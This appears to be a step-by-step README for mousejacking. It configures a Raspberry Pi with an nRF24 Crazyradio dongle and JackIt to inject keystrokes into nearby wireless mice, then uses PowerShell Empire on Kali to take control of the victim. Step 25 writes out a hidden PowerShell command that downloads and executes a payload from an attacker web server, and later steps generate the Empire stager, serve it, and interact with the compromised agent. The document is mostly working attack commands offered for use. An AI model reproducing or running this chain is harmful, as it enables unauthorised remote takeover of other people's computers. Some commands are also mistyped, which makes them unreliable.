### MOUSE JACKING 

## REQUIREMENTS :-

crazy radio PA usb adapter (chip nRF 24L)

=> MINI RASPBERRY PI 0

=> 3.5/3.7 v BATTERY

## GITHUB LINK :->

https://github.com/insecurityofthings/jackit

## RASPBERRY PI COMMANDS :=>

Step 1 :->  sudo apt-get update

Step 2 :->  sudo apt-get upgrade

Step 3 :->  sudo apt-get install sdcc binutils python python-pip git openssh-server

Step 4 :->  pip install -U pip

Step 5 :->  pip install -U -I pyusb

Step 6 :->  pip install -U platformio

Step 7 :->  gitclone https://github.com/BastilleResearch/nrf-research-firmware

Step 8 :->  cd nrf-research-firmware

Step 9 :->  ls

Step 10 :->  sudo make

Step 11 :->  connect usb dongle to raspberry pi 

Step 12 :->  type => sudo make install

Step 13 :->  gitclone https://github.com/insecurityofthings/jackit.git

Step 14 :->  cd..

Step 15 :->  cd jackit

Step 16 :->  cat requirements.txt

Step 17 :->  sudo pip install -r requirements.txt

Step 18 :->  cd nrf-research-firmware

Step 19 :->  cd tools

Step 20 :->  cd jackit

Step 21 :->  sudo touch pspwn

Step 22 :->  sudo vi pspwn

Step 23 :->  GUI r

Step 24 :->  DELAY 200

Step 25 :->  STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring(http://apachewebserverIP/filename')"     ((EXAMPLE FOR THIS =>> HTTP://192.168.0.0/PSPWN))  

Step 26 :->  enter  =>>  PRESS ESC  =>>  TYPE wq:!  =>>  press ENTER (to save the file)



### to search the listner :=>> 



Step 27 :->  sudo python nrf24-scanner.py -L

Step 28 :->  CTRL + C



## USING EMPIRE IN KALI-LINUX ATTACKER MACHINE



Step 29 :->  sudo apt-get update

Step 30 :->  sudo apt-get upgrade

Step 31 :->  sudo apt-get install -y git apache2 python-pip python-dev python-m2crypto swig

Step 32 :->  sudo pip install pycrypto iptools pydispatcher flask

Step 33 :->  sudo git clone https://github.com/powershellEmprie/Empire.git

Step 34 :->  cd Empire/setup

Step 35 :->  sudo ./install.sh

Step 36 :->  enter

Step 37 :->  cd..

Step 38 :->  cd ./Empire

Step 39 :->  listeners

Step 40 :->  info

Step 41 :->  set name filename(example pspwn)

Step 42 :->  set host http://apachewebserverIP ADDRESS:8080

Step 43 :->  execute

Step 44 :->  list

Step 45 :->  use stager launcher

Step 46 :->  set Listener filename(example pspwm)

Step 47 :->  set Base64 False

Step 48 :->  set Outfile filename.ps1(example pspwn.ps1)

Step 49 :->  generate

Step 50 :->  exit  =>>  ls

Step 51 :->  now copy the file to apache web server folder

Step 52 :->  sudo cp filename.ps1(example pspwn.ps1) /var/www/html/name of the file(example pspwn)

Step 53 :->  sudo ./Empire



## JACKIT TERMINAL 



Step 54 :->  sudo python jackit.py --script pspwn 

Step 55 :->  cntrl + C

Step 56 :->  enter the key no of the mouse targets on the screen for example 1 ,2 ,3.



## KALI LINUX EMPIRE TERMINAL



Step 57 :->  agents

Step 58 :->  interact agentname

Step 59 :->  ls

Step 60 :->  getpid

Step 61 :->  getuid

Step 60 :->  cd c:\Users\ (to run powershell service) 










____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________



